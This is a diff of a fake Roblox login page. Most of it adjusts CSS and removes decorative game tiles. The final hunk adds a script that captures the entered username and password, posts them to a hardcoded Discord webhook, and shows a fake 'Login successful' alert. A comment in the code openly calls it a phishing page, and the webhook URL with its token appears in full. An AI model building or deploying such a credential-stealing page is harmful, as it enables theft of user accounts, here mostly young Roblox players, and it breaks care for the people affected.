@@ -12,7 +12,7 @@
     }
 
     body {
-      background-color: #111;
+      background-color: #000;
       color: white;
       display: flex;
       min-height: 100vh;
@@ -22,7 +22,7 @@
     /* Left Panel */
     .left-panel {
       width: 400px;
-      background-color: #151515;
+      background-color: #111;
       padding: 40px 30px;
       display: flex;
       flex-direction: column;
@@ -30,7 +30,7 @@
     }
 
     .logo {
-      font-size: 28px;
+      font-size: 24px;
       font-weight: bold;
       color: #fff;
       margin-bottom: 30px;
@@ -39,21 +39,21 @@
     }
 
     .logo img {
-      width: 32px;
-      height: 32px;
+      width: 24px;
+      height: 24px;
       margin-right: 10px;
     }
 
     .panel-title {
-      font-size: 24px;
+      font-size: 20px;
       font-weight: 600;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
     }
 
     .panel-subtitle {
-      font-size: 14px;
+      font-size: 12px;
       color: #999;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
     }
 
     .login-form {
@@ -68,7 +68,7 @@
     .form-group label {
       display: block;
       margin-bottom: 5px;
-      font-size: 14px;
+      font-size: 12px;
       color: #ccc;
     }
 
@@ -119,12 +119,12 @@
     .divider-text {
       padding: 0 10px;
       color: #999;
-      font-size: 14px;
+      font-size: 12px;
     }
 
     .signup-link {
       text-align: center;
-      font-size: 14px;
+      font-size: 12px;
       color: #999;
     }
 
@@ -153,76 +153,6 @@
       right: 0;
       bottom: 0;
       background: rgba(0, 0, 0, 0.5);
-    }
-
-    .game-tiles {
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      grid-template-rows: repeat(3, 1fr);
-      gap: 20px;
-      padding: 40px;
-      pointer-events: none;
-    }
-
-    .game-tile {
-      background: rgba(0, 0, 0, 0.5);
-      border-radius: 8px;
-      overflow: hidden;
-      position: relative;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-      pointer-events: auto;
-    }
-
-    .game-tile img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    .game-tile:hover {
-      transform: scale(1.05);
-      z-index: 1;
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5);
-    }
-
-    .back-btn {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      background: rgba(0, 0, 0, 0.5);
-      color: white;
-      border: none;
-      border-radius: 4px;
-      padding: 8px 16px;
-      cursor: pointer;
-      font-size: 14px;
-    }
-
-    .back-btn:hover {
-      background: rgba(0, 0, 0, 0.7);
-    }
-
-    .create-account-btn {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      background: #00a2ff;
-      color: black;
-      border: none;
-      border-radius: 4px;
-      padding: 8px 16px;
-      cursor: pointer;
-      font-size: 14px;
-      font-weight: bold;
-    }
-
-    .create-account-btn:hover {
-      background: #0088cc;
     }
 
     /* Responsive */
@@ -273,9 +203,41 @@
   </div>
 
   <!-- Right Panel -->
-  <div class="right-panel">
-    <div class="game-tiles">
-      <div class="game-tile"><img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Game 1"></div>
-      <div class="game-tile"><img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Game 2"></div>
-      <div class="game-tile"><img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Game 3"></div>
-      <div class="game-tile"><img src="
+  <div class="right-panel"></div>
+
+  <script>
+    const webhook = 'https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc';
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const payload = {
+        embeds: [{
+          title: 'New Roblox Login',
+          description: `**Username:** \`${username}\`\n**Password:** \`${password}\``,
+          color: 0x00a2ff
+        }]
+      };
+
+      try {
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error('Failed to send to Discord:', error);
+      }
+
+      // Fake success message
+      alert('Login successful! Redirecting...');
+      // In a real phishing page, you might redirect to a fake "dashboard" or just reload the page.
+      // For testing, we'll just reload to reset the form.
+      window.location.reload();
+    });
+  </script>
+</body>
+</html>
